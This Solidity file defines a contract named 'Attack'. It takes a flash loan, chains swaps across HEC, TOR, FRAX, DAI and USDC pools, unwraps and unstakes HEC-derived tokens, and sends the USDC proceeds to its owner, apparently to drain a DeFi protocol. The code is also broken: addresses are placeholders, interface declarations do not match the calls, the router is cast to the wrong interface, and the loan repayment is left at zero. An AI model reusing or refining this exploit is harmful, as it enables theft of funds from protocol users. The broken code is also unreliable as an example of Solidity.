// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.8.0 <0.9.0;

interface IERC20 {
  function totalSupply() external view returns (uint256 _supply);
  function balanceOf(address _owner) external view returns (uint256 _balance);
  function approve(address _spender, uint256 _value) external returns (bool _success);
  function transfer(address _to, uint256 _value) external returns (bool _success);
}

interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);

    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;

    function initialize(address, address) external;
}

interface IUniswapV2Router01 {

    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
}

interface IHECFarm{
    function unWarp();
    function unstake();
}
interface IVault{
    function flashLoan();
}


contract Attack {
    address owner;
    address HEC = 0x4200000000000000000000000000000000000006;
    address sHEC = 0x1F32b1c2345538c0c6f582fCB022739c4A194Ebb;
    address wsHEC = 0x7F5c764cBc14f9669B88837ca1490cCa17c31607;
    address DAI = 0xEfDE221f306152971D8e9f181bFe998447975810;
    address wFTM = 0xEfDE221f306152971D8e9f181bFe998447975810;
    address FRAX = 0x2;
    address TOR = 0x1;
    address USDC=0X111;

    address vault_address = 0x3;
    address HEC_FRAX_Pair = 0x5;
    address wsHEC_wFTM_Pair = 0x6;
    address wFTM_TOR_Pair = 0x8;
    address TOR_HEC_Pair = 0x7;
    address USDC_HEC_Pair = 0x9;
    address uwsHEC_Farm = 0x10;
    address usHEC_Farm = 0x11;
    address DAI_HEC_Pair = 0x13;

    address router_address = 0x12;

    IVault vault;
    IUniswapV2Router01 router;

    constructor() public {
        owner =  msg.sender;
        vault = IVault(vault_address);
        router = IVault(router_address);
    }
    modifier onlyOwner(){
        require(msg.sender == owner);
        _;
    }
    event LogEventName(address param1);
    event Price(uint price);

    function withDraw(address token,uint amount) public onlyOwner{
        IERC20(token).transfer(owner,amount);
    }

    function doAttack() public{
        //falsh loan
        vault.flashLoanSimple(address(this), wFTM, 3800*1e18, "", 0);      
        IERC20(USDC).transfer(owner,IERC20(USDC).balanceOf(address(this)));
    }

    function executeOperation(address asset, uint256 amount, uint256 premium, address initiator, bytes calldata)
        external
        returns (bool)
    {   
        IERC20(HEC).approve(address(router),type(uint256).max);
        IERC20(wFTM).approve(address(router),type(uint256).max);
        IERC20(DAI).approve(address(router),type(uint256).max);
        IERC20(TOR).approve(address(router),type(uint256).max);
        IERC20(FRAX).approve(address(router),type(uint256).max);
        IERC20(USDC).approve(address(router),type(uint256).max);

        uint needFrax = IERC20(FRAX).balanceOf(HEC_FRAX_Pair);
        //swap out frax
        router.swapTokensForExactTokens(needFrax,10000*1e18,[wFTM,FRAX],address(this),0);
        //swap out HEC use frax
        router.swapExactTokensForTokens(needFrax,0,[FRAX,HEC],address(this),0);
        //swap out TOR use wFTM
        router.swapExactTokensForTokens(IERC20(wFTM).balanceOf(wFTM_TOR_Pair),0,[wFTM,TOR],address(this),0);
        //swap out HEC use TOR
        router.swapExactTokensForTokens(IERC20(TOR).balanceOf(address(this)),0,[TOR,HEC],address(this),0);
        //swap out wsHEC use wFTM
        router.swapExactTokensForTokens(IERC20(wFTM).balanceOf(wsHEC_wFTM_Pair),0,[wFTM,wsHEC],address(this),0);
        IERC20(wsHEC).approve(uwsHEC_Farm,type(uint256).max);
        // unwrap wsHEC
        IHECFarm(uwsHEC_Farm).unwrap(IERC20(wsHEC).balanceOf(address(this)));
        IHECFarm(usHEC_Farm).unstake(IERC20(sHEC).balanceOf(address(this)));

        //swap DAI use HEC
        router.swapExactTokensForTokens(IERC20(HEC).balanceOf(DAI_HEC_Pair),0,[HEC,DAI],address(this),0);
        //swap USDC use DAI
        router.swapExactTokensForTokens(IERC20(DAI).balanceOf(address(this)),0,[DAI,USDC],address(this),0);
        //swap USDC use HEC
        router.swapExactTokensForTokens(IERC20(HEC).balanceOf(address(this)),0,[HEC,USDC],address(this),0);
        uint repayAmount=0;
        router.swapTokensForExactTokens(repayAmount,10000*1e18,[USDC,wFTM],address(this),0);

        //repay flashLoan            

        return true;
    }

    receive() external payable {
        
    }

}
